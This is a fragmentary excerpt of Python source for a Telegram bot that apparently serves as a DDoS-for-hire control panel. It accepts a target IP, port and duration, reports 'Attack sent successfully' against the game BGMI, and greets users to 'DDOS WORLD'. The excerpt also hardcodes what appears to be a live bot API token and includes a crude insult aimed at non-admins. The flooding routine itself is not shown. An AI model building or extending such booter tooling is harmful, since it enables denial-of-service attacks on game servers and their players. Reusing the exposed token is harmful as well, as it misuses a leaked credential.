...
bot = telebot.TeleBot('7397594417:AAHDU2J3QDf8pBcY1Q7SEteChWUMPCCe8gw')
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣:- @TMZEROO."
...
# Countdown ka message send karne ka function
def send_countdown_message(message, target_ip, target_port, duration, username_link):
    chat_id = message.chat.id
    ...
    for remaining_time in range(duration - 1, -1, -1):
        try:
            time.sleep(1)  # Use time.sleep(1) to pause for 1 second
...
def start_attack_reply(message, target, port, time):
    ...
    username_link = f"[@{username}](tg://user?id={message.from_user.id})"

    # Static message for attack start
    response = (
        f"🎇 𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐞𝐧𝐭 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲! 🎇\n\n"
        f"🎯 𝐓𝐚𝐫𝐠𝐞𝐭: `{target}`\n"
        f"🔌 𝐏𝐨𝐫𝐭: `{port}`\n"
        f"⏳ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: `{time} seconds`\n"
        f"🎮 𝐆𝐚𝐦𝐞: `𝐁𝐆𝐌𝐈`\n"
        f"👤 𝐀𝐭𝐭𝐚𝐜𝐤 𝐛𝐲: {username_link}\n"
    )

    # Add keyboard (JOIN CHANNEL button)
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(
        telebot.types.InlineKeyboardButton("💟JOIN CHANNEL💟", url="https://t.me/creativeydv")
    )

    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)

    # Call the countdown function to handle time updates
    send_countdown_message(message, target, port, time, username_link)
...
🚀 𝐑𝐞𝐚𝐝𝐲 𝐭𝐨 𝐬𝐮𝐩𝐞𝐫𝐜𝐡𝐚𝐫𝐠𝐞 𝐲𝐨𝐮𝐫 𝐞𝐱𝐩𝐞𝐫𝐢𝐞𝐧𝐜𝐞? 𝐓𝐚𝐤𝐞 𝐚𝐜𝐭𝐢𝐨𝐧 𝐚𝐧𝐝 𝐠𝐞𝐭 𝐫𝐞𝐚𝐝𝐲 𝐟𝐨𝐫 𝐩𝐨𝐰𝐞𝐫𝐟𝐮𝐥 𝐚𝐭𝐭𝐚𝐜𝐤𝐬!'''
...
def show_help(message):
    help_text ='''🌍 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐃𝐃𝐎𝐒 𝐖𝐎𝐑𝐋𝐃!* 🎉
